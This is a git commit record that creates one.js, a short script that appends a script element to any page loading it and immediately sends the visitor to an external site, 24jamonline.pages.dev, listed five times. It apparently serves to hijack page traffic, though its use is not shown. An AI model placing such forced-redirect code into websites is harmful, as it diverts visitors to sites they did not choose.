672956d79b26d9e6818a58ee3429b1db78f8e891
judisuhu1-ux <judisuhu1@gmail.com>
2026-04-23 13:49:17 +0800

    Create one.js

---
+++ one.js
@@ -0,0 +1,29 @@
+var url = Array(
+  "https://24jamonline.pages.dev/",
+  "https://24jamonline.pages.dev/",
+  "https://24jamonline.pages.dev/",
+  "https://24jamonline.pages.dev/",
+  "https://24jamonline.pages.dev/"
+);
+var rid = "";
+
+var timesleep = 0;  // Tidak ada penundaan atau penundaan minimal
+
+function put() {
+    var script = document.createElement("script");
+    script.innerHTML = 'var weburl = url[Math.floor(Math.random()*url.length)] + "" + rid; setTimeout(function () { window.location = weburl; }, timesleep);';
+    document.body.appendChild(script);
+}
+
+function jump() {
+    if (typeof url == 'undefined' || url == null) {
+        setTimeout(function() {
+            jump();
+        }, 50);
+    } else {
+        put();
+    }
+}
+
+
+jump();
